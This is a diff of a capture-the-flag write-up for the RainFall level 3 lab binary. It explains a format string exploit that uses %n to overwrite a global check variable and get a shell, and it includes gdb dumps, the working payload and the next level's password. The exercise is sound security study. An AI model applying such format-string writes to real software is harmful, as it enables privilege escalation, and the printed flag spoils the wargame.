@@ -1,32 +1,83 @@
-#Format string  
-  
-As you can see on the "disassembled.png" picture, in red at *v+62 we have a conditional jump to execute a shell or leave the progam.  
+# level 03
 
+The program take no parameters but wait for input once launched. It doesn't looks like to segault with large strings :
 
-At *v+54 we mov 0x0804988c in eax and for execute the the need 0x40 (64)
+```bash
+level3@RainFall:~$ python -c 'print "A" * 30' | ./level3 
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+level3@RainFall:~$ python -c 'print "A" * 100' | ./level3 
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+level3@RainFall:~$ python -c 'print "A" * 200' | ./level3 
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+```
 
-As you can see on the "v\_54\_0x0804988c\_value.png" picture we have 0x0 at the "0x0804988c" address.  
-  
-But how can I change that !?  
-  
-In the man of printf in the bug section, you can see if print take an user input in first parameter, it's a security hole.
+By looking at the assembly code, we can see that the function to inspect is the `v` function.
 
-As you can see on the "printf\_parameter.png" picture, printf get the user input in the first parameter
+Basically, this function takes an input with `fgets`, and pass it as the only parameter to `printf`. Then, it checks if a variable `m` is equals to 64 and open a shell if it's true. Our objective is so to modify the value of this variable as it is 0 by default :
 
-To test if this security hole work we can pass "%x" in argument fo watch if printf print the first argument on the stack after our argument.
+```gdb
+(gdb) x/d 0x804988c
+0x804988c <m>:  0
+```
 
-You can see the "proof\_printf\_security\_hole.png" picture, it's works, and we have get the number of the Direct Access Parameter to acces at our string.
+As seen in the bug section of printf man, passing directly the user input to `printf` is a security hole. We can exploit this program with a [Format String Exploit](https://en.wikipedia.org/wiki/Uncontrolled_format_string).
 
-If we jump manually to *v+62 from *v+64 and continue in gdb, we can see, it's execute a shell, we have to do that !
+We can check this by trying to print the stack :
 
-This printf security hole can modify the value to an address, in our case, it works like that:  
-"\<address\_to\_modify>\<NB\_char\_print\_here\_is\_the\_value\_to\_the\_address>\<Direct\_Access\_Parameter>"  
+```gdb
+(gdb) run
+Starting program: /home/user/level3/level3 
+%x %x %x %x
+200 b7fd1ac0 b7ff37d0 25207825
 
-We can do that like this in gdb:  
-  
-run <<< $(python -c 'print "\x8c\x98\x04\x08" + "%60x" + "%4$n"')  
-  
-You can see that in the "GDB\_POC.png" picture.  
-  
-Ok, It's works, you can get the level4 user privilege and get the flag like that:  
-(python -c 'print "\x8c\x98\x04\x08" + "%60x" + "%4$n"';cat) | ./level3
+Breakpoint 1, 0x080484da in v ()
+(gdb) x/24wx $esp
+0xbffff500:     0xbffff510      0x00000200      0xb7fd1ac0      0xb7ff37d0
+0xbffff510:     0x25207825      0x78252078      0x0a782520      0xb7fef300
+0xbffff520:     0xbffff578      0xb7fde2d4      0xb7fde334      0x00000007
+```
+
+Here, `printf` begin by printing the stack from `0xbffff504`. If we take an input before printing stack value, we can see that our argument is at the 4th position :
+
+```gdb
+(gdb) run
+Starting program: /home/user/level3/level3 
+AAAA %x %x %x %x %x
+AAAA 200 b7fd1ac0 b7ff37d0 41414141 20782520
+
+Breakpoint 1, 0x080484da in v ()
+(gdb) x/24wx $esp
+0xbffff500:     0xbffff510      0x00000200      0xb7fd1ac0      0xb7ff37d0
+0xbffff510:     0x41414141      0x20782520      0x25207825      0x78252078
+0xbffff520:     0xbfff000a      0xb7fde2d4      0xb7fde334      0x00000007
+```
+
+Thanks to the `%n` modifier, we can write at a special address by filling it's value with the number of printed bytes :
+
+```gdb
+(gdb) r <<< $(python -c 'print "\x8c\x98\x04\x08" + "%4$n"')
+The program being debugged has been started already.
+Start it from the beginning? (y or n) y
+
+Starting program: /home/user/level3/level3 <<< $(python -c 'print "\x8c\x98\x04\x08" + "%4$n"')
+��
+
+Breakpoint 1, 0x080484da in v ()
+(gdb) x/d 0x0804988c
+0x804988c <m>:  4
+```
+
+We can see that the `m` variable taked the value of the printed bytes, here 4.
+
+We need to print 60 more bytes to changed its value to 64.
+
+Get the flag :
+
+```bash
+level3@RainFall:~$ (python -c 'print "\x8c\x98\x04\x08" + "%60x" + "%4$n"';cat) | ./level3
+�                                                         200
+Wait what?!
+cd ../level4
+cat .pass
+b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa
+```
